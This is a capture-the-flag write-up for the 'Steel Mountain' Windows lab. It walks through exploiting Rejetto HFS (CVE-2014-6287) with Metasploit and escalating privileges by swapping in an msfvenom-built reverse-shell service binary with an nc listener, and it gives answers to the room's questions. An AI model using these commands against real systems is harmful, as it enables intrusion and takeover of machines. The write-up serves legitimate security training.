# Room: Steel Mountain
### Difficulty: Easy
### Objectives: Hack into a Mr. Robot themed Windows machine. Use Metasploit for initial access, utilise PowerShell for Windows privilege escalation enumeration, and learn a new technique to get Administrator access.

## Recon

Before we do anything else, first we must scan the network so we can see the potential exploits.
``` bash
nmap -sC -sV -p- TARGET_IP
```
### Interesting open ports:
``` plaintext
80 (HTTP)
8080 (HttpFileServer httpd 2.3)
445 (SMB)
139 (SMB)
135 (MSRPC)
3389 (RDP)
```
Upon accessing port 80, I found the Employee of the Month page at Steel Mountain. Using Google reverse image search, I found the person named Bill Harper from Mr. Robot.
### Question: Who is the employee of the month?
Answer: Bill Harper

## Initial Access

### Question: What is the other port running a web server on?
Answer: 8080

While browsing port 8080, I found the website using Rejetto HTTP File Server.

### Question: Take a look at the other web server. What file server is running?
Answer: Rejetto HTTP File Server

Using the information we gathered, we can also see that Rejetto version 2.3 is running. I used Exploit‑DB to find available exploits and found the potential exploit CVE‑2014‑6287.

This exploit can lead to Remote Code Execution.

### Question: What is the CVE number to exploit this file server?
Answer: CVE-2014-6287

## Exploitation

Using Metasploit, I used the module:
``` bash
use exploit/windows/http/rejetto_hfs_exec
```
Then I executed the exploit and managed to gain a reverse shell.

### Question: Use Metasploit to get an initial shell. What is the user flag?
Answer: b04***

## Privilege Escalation Enumeration

To enumerate this machine, we will use a PowerShell script called PowerUp. Its purpose is to evaluate a Windows machine and determine any abnormalities.
PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
### Here is the link: 
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

To execute this using Meterpreter, I loaded PowerShell:
``` bash
load powershell
```
Then I entered the PowerShell shell:
``` bash
powershell_shell
```
## Vulnerability Found

Take close attention to the CanRestart option that is set to True.

### Question: What is the name of the service which shows up as an unquoted service path vulnerability?
Answer: AdvancedSystemCareService9

The CanRestart option being true allows us to restart a service on the system. The directory to the application is also writeable. This means we can replace the legitimate application with our malicious one and restart the service, which will run our infected program.

## Privilege Escalation Exploit
Use msfvenom to generate a reverse shell as a Windows executable.
``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
### Commands:

First, we must stop the service before replacing the legitimate one with our binary.
``` bash
sc.exe stop AdvancedSystemCareService9
```
Then we can replace it.
``` bash
copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe" -Force
```
Start your listener using netcat. 
``` bash
nc -lvnp 4443
```
Then start the program.
``` bash
sc.exe start AdvancedSystemCareService9
```
Now we can read the root.txt.

### Question: What is the root flag?
Answer: 9af***
